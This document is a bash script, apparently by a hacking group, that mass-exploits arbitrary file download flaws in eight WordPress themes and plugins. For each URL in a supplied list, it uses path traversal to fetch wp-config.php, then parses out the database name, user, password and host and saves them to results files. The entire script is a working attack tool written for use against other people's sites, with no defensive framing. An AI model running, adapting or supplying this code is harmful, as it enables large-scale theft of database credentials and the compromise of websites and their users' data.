#!/bin/bash

# Author: 4WSec
# Team: Anon Cyber Team
# Date: 24/03/2019
# © Copyright ~ 4WSec

# color
PP='\033[95m' # purple
CY='\033[96m' # cyan
BL='\033[94m' # blue
GR='\033[92m' # green
YW='\033[93m' # yellow
RD='\033[91m' # red
NT='\033[97m' # netral
WH='\033[37m' # white
O='\e[0m'
B='\e[5m'
U='\e[4m'


# Ratio
clear
con=1
sl33p=2
threads=1
year=`date "+%Y"`
month=`date "+%m"`


# WordPress 4.x Nishizawa_Tmp Themes Database Configuration File Download
function wp_nishizawa () {
	local xxx=$(curl -s "${urllist}/wp-content/themes/nishizawa_tmp/force-download.php?file=../../../wp-config.php" -L \
	            -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0' \
	            -w '%{http_code}' -o wp-nishizawa.tmp --connect-timeout 5)
	if [[ $xxx == 404 ]] || [[ -z $(cat wp-nishizawa.tmp) ]]; then
		printf "${NT}[${RD}*${NT}] ${YW}$urllist ${NT}=> ${CY}[WP Nishizawa_Tmp] ${RD}[Not Vuln]\n"
	else
		local dbname=$(cat wp-nishizawa.tmp | grep -Po "(?<='DB_NAME', ').*?(?=')")
		local dbuser=$(cat wp-nishizawa.tmp | grep -Po "(?<='DB_USER', ').*?(?=')")
		local dbpass=$(cat wp-nishizawa.tmp | grep -Po "(?<='DB_PASSWORD', ').*?(?=')")
		local dbhost=$(cat wp-nishizawa.tmp | grep -Po "(?<='DB_HOST', ').*?(?=')")
		printf "${NT}[${RD}*${NT}] ${YW}$urllist ${NT}=> ${CY}[WP Nishizawa_Tmp] ${GR}[Vuln]\n"
		printf "${NT}............................\n"
		printf "${GR}DB NAME     ${NT}=> ${GR}$dbname\n"
		printf "${GR}DB USER     ${NT}=> ${GR}$dbuser\n"
		printf "${GR}DB PASSWORD ${NT}=> ${GR}$dbpass\n"
		printf "${GR}DB HOST     ${NT}=> ${GR}$dbhost\n"
		printf "${NT}............................\n"
		echo "[*] $urllist => ${CY}[WP Nishizawa_Tmp] ${GR}[Vuln]" >> results-wp-nishizawa.txt
		echo "............................" >> results-wp-nishizawa.txt
		echo "DB NAME     => $dbname" >> results-wp-nishizawa.txt
		echo "DB USER     => $dbuser" >> results-wp-nishizawa.txt
		echo "DB PASSWORD => $dbpass" >> results-wp-nishizawa.txt
		echo "DB HOST     => $dbhost" >> results-wp-nishizawa.txt
		echo "............................" >> results-wp-nishizawa.txt
	fi
}


# WordPress 4.7.13 ChurcHope Responsive Themes 4.7.x Database Configuration File Download
function wp_churchope () {
	local xxx=$(curl -s "${urllist}/wp-content/themes/churchope/lib/downloadlink.php?file=../../../../wp-config.php" -L \
	            -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0' \
	            -w '%{http_code}' -o wp-churchope.tmp --connect-timeout 5)
	if [[ $xxx == 404 ]] || [[ -z $(cat wp-churchope.tmp) ]]; then
		printf "${NT}[${RD}*${NT}] ${YW}$urllist ${NT}=> ${CY}[WP ChurcHope] ${RD}[Not Vuln]\n"
	else
		local dbname=$(cat wp-churchope.tmp | grep -Po "(?<='DB_NAME', ').*?(?=')")
		local dbuser=$(cat wp-churchope.tmp | grep -Po "(?<='DB_USER', ').*?(?=')")
		local dbpass=$(cat wp-churchope.tmp | grep -Po "(?<='DB_PASSWORD', ').*?(?=')")
		local dbhost=$(cat wp-churchope.tmp | grep -Po "(?<='DB_HOST', ').*?(?=')")
		printf "${NT}[${RD}*${NT}] ${YW}$urllist ${NT}=> ${CY}[WP ChurcHope] ${GR}[Vuln]\n"
		printf "${NT}............................\n"
		printf "${GR}DB NAME     ${NT}=> ${GR}$dbname\n"
		printf "${GR}DB USER     ${NT}=> ${GR}$dbuser\n"
		printf "${GR}DB PASSWORD ${NT}=> ${GR}$dbpass\n"
		printf "${GR}DB HOST     ${NT}=> ${GR}$dbhost\n"
		printf "${NT}............................\n"
		echo "[*] $urllist => [WP ChurcHope] [Vuln]" >> results-wp-churchope.txt
		echo "............................" >> results-wp-churchope.txt
		echo "DB NAME     => $dbname" >> results-wp-churchope.txt
		echo "DB USER     => $dbuser" >> results-wp-churchope.txt
		echo "DB PASSWORD => $dbpass" >> results-wp-churchope.txt
		echo "DB HOST     => $dbhost" >> results-wp-churchope.txt
		echo "............................" >> results-wp-churchope.txt
	fi
}


# WordPress 4.2.2 Oxygen-Theme Themes Database Configuration File Download
function wp_oxygen () {
	local xxx=$(curl -s "${urllist}/wp-content/themes/oxygen-theme/download.php?file=../../../wp-config.php" -L \
	            -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0' \
	            -w '%{http_code}' -o wp-oxygen.tmp --connect-timeout 5)
	if [[ $xxx == 404 ]] || [[ -z $(cat wp-oxygen.tmp) ]]; then
		printf "${NT}[${RD}*${NT}] ${YW}$urllist ${NT}=> ${CY}[WP Oxygen] ${RD}[Not Vuln]\n"
	else
		local dbname=$(cat wp-oxygen.tmp | grep -Po "(?<='DB_NAME', ').*?(?=')")
		local dbuser=$(cat wp-oxygen.tmp | grep -Po "(?<='DB_USER', ').*?(?=')")
		local dbpass=$(cat wp-oxygen.tmp | grep -Po "(?<='DB_PASSWORD', ').*?(?=')")
		local dbhost=$(cat wp-oxygen.tmp | grep -Po "(?<='DB_HOST', ').*?(?=')")
		printf "${NT}[${RD}*${NT}] ${YW}$urllist ${NT}=> ${CY}[WP Oxygen] ${GR}[Vuln]\n"
		printf "${NT}............................\n"
		printf "${GR}DB NAME     ${NT}=> ${GR}$dbname\n"
		printf "${GR}DB USER     ${NT}=> ${GR}$dbuser\n"
		printf "${GR}DB PASSWORD ${NT}=> ${GR}$dbpass\n"
		printf "${GR}DB HOST     ${NT}=> ${GR}$dbhost\n"
		printf "${NT}............................\n"
		echo "[*] $urllist => [WP Oxygen] [Vuln]" >> results-wp-oxygen.txt
		echo "............................" >> results-wp-oxygen.txt
		echo "DB NAME     => $dbname" >> results-wp-oxygen.txt
		echo "DB USER     => $dbuser" >> results-wp-oxygen.txt
		echo "DB PASSWORD => $dbpass" >> results-wp-oxygen.txt
		echo "DB HOST     => $dbhost" >> results-wp-oxygen.txt
		echo "............................" >> results-wp-oxygen.txt
	fi
}


# WordPress 4.x CafeSalivation Themes Database Configuration File Download
function wp_cafesalivation () {
	local xxx=$(curl -s "${urllist}/wp-content/themes/cafesalivation/download.php?filename=../../wp-config.php" -L \
	            -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0' \
	            -w '%{http_code}' -o wp-cafesalivation.tmp --connect-timeout 5)
	if [[ $xxx == 404 ]] || [[ -z $(cat wp-cafesalivation.tmp) ]]; then
		printf "${NT}[${RD}*${NT}] ${YW}$urllist ${NT}=> ${CY}[WP CafeSalivation] ${RD}[Not Vuln]\n"
	else
		local dbname=$(cat wp-cafesalivation.tmp | grep -Po "(?<='DB_NAME', ').*?(?=')")
		local dbuser=$(cat wp-cafesalivation.tmp | grep -Po "(?<='DB_USER', ').*?(?=')")
		local dbpass=$(cat wp-cafesalivation.tmp | grep -Po "(?<='DB_PASSWORD', ').*?(?=')")
		local dbhost=$(cat wp-cafesalivation.tmp | grep -Po "(?<='DB_HOST', ').*?(?=')")
		printf "${NT}[${RD}*${NT}] ${YW}$urllist ${NT}=> ${CY}[WP CafeSalivation] ${GR}[Vuln]\n"
		printf "${NT}............................\n"
		printf "${GR}DB NAME     ${NT}=> ${GR}$dbname\n"
		printf "${GR}DB USER     ${NT}=> ${GR}$dbuser\n"
		printf "${GR}DB PASSWORD ${NT}=> ${GR}$dbpass\n"
		printf "${GR}DB HOST     ${NT}=> ${GR}$dbhost\n"
		printf "${NT}............................\n"
		echo "[*] $urllist => [WP CafeSalivation] [Vuln]" >> results-wp-cafesalivation.txt
		echo "............................" >> results-wp-cafesalivation.txt
		echo "DB NAME     => $dbname" >> results-wp-cafesalivation.txt
		echo "DB USER     => $dbuser" >> results-wp-cafesalivation.txt
		echo "DB PASSWORD => $dbpass" >> results-wp-cafesalivation.txt
		echo "DB HOST     => $dbhost" >> results-wp-cafesalivation.txt
		echo "............................" >> results-wp-cafesalivation.txt
	fi
}


# WordPress 4.9.x U_Parts Themes Database Configuration File Download
function wp_uparts () {
	local xxx=$(curl -s "${urllist}/wp-content/themes/u_parts/force-download.php?file=../../../wp-config.php" -L \
	            -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0' \
	            -w '%{http_code}' -o wp-uparts.tmp --connect-timeout 5)
	if [[ $xxx == 404 ]] || [[ -z $(cat wp-uparts.tmp) ]]; then
		printf "${NT}[${RD}*${NT}] ${YW}$urllist ${NT}=> ${CY}[WP U_Parts] ${RD}[Not Vuln]\n"
	else
		local dbname=$(cat wp-uparts.tmp | grep -Po "(?<='DB_NAME', ').*?(?=')")
		local dbuser=$(cat wp-uparts.tmp | grep -Po "(?<='DB_USER', ').*?(?=')")
		local dbpass=$(cat wp-uparts.tmp | grep -Po "(?<='DB_PASSWORD', ').*?(?=')")
		local dbhost=$(cat wp-uparts.tmp | grep -Po "(?<='DB_HOST', ').*?(?=')")
		printf "${NT}[${RD}*${NT}] ${YW}$urllist ${NT}=> ${CY}[WP U_Parts] ${GR}[Vuln]\n"
		printf "${NT}............................\n"
		printf "${GR}DB NAME     ${NT}=> ${GR}$dbname\n"
		printf "${GR}DB USER     ${NT}=> ${GR}$dbuser\n"
		printf "${GR}DB PASSWORD ${NT}=> ${GR}$dbpass\n"
		printf "${GR}DB HOST     ${NT}=> ${GR}$dbhost\n"
		printf "${NT}............................\n"
		echo "[*] $urllist => [WP U_Parts] [Vuln]" >> results-wp-uparts.txt
		echo "............................" >> results-wp-uparts.txt
		echo "DB NAME     => $dbname" >> results-wp-uparts.txt
		echo "DB USER     => $dbuser" >> results-wp-uparts.txt
		echo "DB PASSWORD => $dbpass" >> results-wp-uparts.txt
		echo "DB HOST     => $dbhost" >> results-wp-uparts.txt
		echo "............................" >> results-wp-uparts.txt
	fi	
}


# WordPress 4.9.8 KingAbdullahPort KAP Themes Database Configuration File Download
function wp_kingabdullahport () {
	local xxx=$(curl -s "${urllist}/wp-content/themes/kap/download.php?url=../../../wp-config.php" -L \
	            -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0' \
	            -w '%{http_code}' -o wp-kingabdullah.tmp --connect-timeout 5)
	if [[ $xxx == 404 ]] || [[ -z $(cat wp-kingabdullah.tmp) ]]; then
		printf "${NT}[${RD}*${NT}] ${YW}$urllist ${NT}=> ${CY}[WP KingAbdullahPort] ${RD}[Not Vuln]\n"
	else
		local dbname=$(cat wp-kingabdullah.tmp | grep -Po "(?<='DB_NAME', ').*?(?=')")
		local dbuser=$(cat wp-kingabdullah.tmp | grep -Po "(?<='DB_USER', ').*?(?=')")
		local dbpass=$(cat wp-kingabdullah.tmp | grep -Po "(?<='DB_PASSWORD', ').*?(?=')")
		local dbhost=$(cat wp-kingabdullah.tmp | grep -Po "(?<='DB_HOST', ').*?(?=')")
		printf "${NT}[${RD}*${NT}] ${YW}$urllist ${NT}=> ${CY}[WP KingAbdullahPort] ${GR}[Vuln]\n"
		printf "${NT}............................\n"
		printf "${GR}DB NAME     ${NT}=> ${GR}$dbname\n"
		printf "${GR}DB USER     ${NT}=> ${GR}$dbuser\n"
		printf "${GR}DB PASSWORD ${NT}=> ${GR}$dbpass\n"
		printf "${GR}DB HOST     ${NT}=> ${GR}$dbhost\n"
		printf "${NT}............................\n"
		echo "[*] $urllist => [WP KingAbdullahPort] [Vuln]" >> results-wp-kingabdullah.txt
		echo "............................" >> results-wp-kingabdullah.txt
		echo "DB NAME     => $dbname" >> results-wp-kingabdullah.txt
		echo "DB USER     => $dbuser" >> results-wp-kingabdullah.txt
		echo "DB PASSWORD => $dbpass" >> results-wp-kingabdullah.txt
		echo "DB HOST     => $dbhost" >> results-wp-kingabdullah.txt
		echo "............................" >> results-wp-kingabdullah.txt
	fi
}


# WordPress NativeChurch Multi-Purpose Themes 5.0.x Arbitrary File Download
function wp_nativechurch () {
	local xxx=$(curl -s "${urllist}/wp-content/themes/NativeChurch/download/download.php?file=../../../../wp-config.php" -L \
	      -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0' \
	      -w '%{http_code}' -o wp-nativechurch.tmp --connect-timeout 5)
	if [[ $xxx == 404 ]] || [[ -z $(cat wp-nativechurch.tmp) ]]; then
		printf "${NT}[${RD}*${NT}] ${YW}$urllist ${NT}=> ${CY}[WP NativeChurch] ${RD}[Not Vuln]\n"
	else
		local dbname=$(cat wp-nativechurch.tmp | grep -Po "(?<='DB_NAME', ').*?(?=')")
		local dbuser=$(cat wp-nativechurch.tmp | grep -Po "(?<='DB_USER', ').*?(?=')")
		local dbpass=$(cat wp-nativechurch.tmp | grep -Po "(?<='DB_PASSWORD', ').*?(?=')")
		local dbhost=$(cat wp-nativechurch.tmp | grep -Po "(?<='DB_HOST', ').*?(?=')")
		printf "${NT}[${RD}*${NT}] ${YW}$urllist ${NT}=> ${CY}[WP NativeChurch] ${GR}[Vuln]\n"
		printf "${NT}............................\n"
		printf "${GR}DB NAME     ${NT}=> ${GR}$dbname\n"
		printf "${GR}DB USER     ${NT}=> ${GR}$dbuser\n"
		printf "${GR}DB PASSWORD ${NT}=> ${GR}$dbpass\n"
		printf "${GR}DB HOST     ${NT}=> ${GR}$dbhost\n"
		printf "${NT}............................\n"
		echo "[*] $urllist => [WP NativeChurch] [Vuln]" >> results-wp-nativechurch.txt
		echo "............................" >> results-wp-nativechurch.txt
		echo "DB NAME     => $dbname" >> results-wp-nativechurch.txt
		echo "DB USER     => $dbuser" >> results-wp-nativechurch.txt
		echo "DB PASSWORD => $dbpass" >> results-wp-nativechurch.txt
		echo "DB HOST     => $dbhost" >> results-wp-nativechurch.txt
		echo "............................" >> results-wp-nativechurch.txt
	fi
}


# WordPress Ad Manager WD 1.0.11 Arbitrary File Download
function wp_admanager () {
	local xxx=$(curl -s "${urllist}/wp-admin/edit.php?post_type=wd_ads_ads&export=export_csv&path=../wp-config.php" -L \
	            -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0' \
	            -w '%{http_code}' -o wp-admanager.tmp --connect-timeout 5)
	if [[ $xxx == 404 ]] || [[ -z $(cat wp-admanager.tmp) ]]; then
		printf "${NT}[${RD}*${NT}] ${YW}$urllist ${NT}=> ${CY}[WP Ad Manager] ${RD}[Not Vuln]\n"
	else
		local dbname=$(cat wp-admanager.tmp | grep -Po "(?<='DB_NAME', ').*?(?=')")
		local dbuser=$(cat wp-admanager.tmp | grep -Po "(?<='DB_USER', ').*?(?=')")
		local dbpass=$(cat wp-admanager.tmp | grep -Po "(?<='DB_PASSWORD', ').*?(?=')")
		local dbhost=$(cat wp-admanager.tmp | grep -Po "(?<='DB_HOST', ').*?(?=')")
		printf "${NT}[${RD}*${NT}] ${YW}$urllist ${NT}=> ${CY}[WP Ad Manager] ${GR}[Vuln]\n"
		printf "${NT}............................\n"
		printf "${GR}DB NAME     ${NT}=> ${GR}$dbname\n"
		printf "${GR}DB USER     ${NT}=> ${GR}$dbuser\n"
		printf "${GR}DB PASSWORD ${NT}=> ${GR}$dbpass\n"
		printf "${GR}DB HOST     ${NT}=> ${GR}$dbhost\n"
		printf "${NT}............................\n"
		echo "[*] $urllist => [WP Ad Manager] [Vuln]" >> results-wp-admanager.txt
		echo "............................" >> results-wp-admanager.txt
		echo "DB NAME     => $dbname" >> results-wp-admanager.txt
		echo "DB USER     => $dbuser" >> results-wp-admanager.txt
		echo "DB PASSWORD => $dbpass" >> results-wp-admanager.txt
		echo "DB HOST     => $dbhost" >> results-wp-admanager.txt
		echo "............................" >> results-wp-admanager.txt
	fi	
}


function gaskeun () {
	IFS=$'\r\n' GLOBIGNORE='*' command eval 'leho=($(cat $uRL))'
	for (( i = 0; i <"${#leho[@]}"; i++ )); do
		urllist="${leho[$i]}"
        fucked=$(expr $con % $threads)
  		if [[ $fucked == 0 && $con > 0 ]]; then
    		sleep $sl33p
  		fi
  		wp_nishizawa &
  		wp_churchope &
  		wp_oxygen &
  		wp_cafesalivation &
  		wp_uparts &
  		wp_kingabdullahport &
  		wp_nativechurch &
  		wp_admanager &
	    con=$[$con+1]
	done
	wait
}


function banner () {
	printf "${GR}
 __    __  _____  __      _       _ _            
/ / /\ \ \/ _ \ \/ /_ __ | | ___ (_) |_ ___ _ __ 
\ \/  \/ / /_)/\  /| '_ \| |/ _ \| | __/ _ \ '__|
 \  /\  / ___/ /  \| |_) | | (_) | | ||  __/ |   
  \/  \/\/    /_/\_\ .__/|_|\___/|_|\__\___|_|   
                   |_| 
                      \e[0m${RD}Author: ${RD}${U}${WH}4WSec (Anon Cyber Team)${O}

"
}

banner
echo -e -n "${NT}[${RD}*${NT}] ${GR}Input URL List: ${WH}"; read uRL;
echo ""
gaskeun
rm -f *.tmp
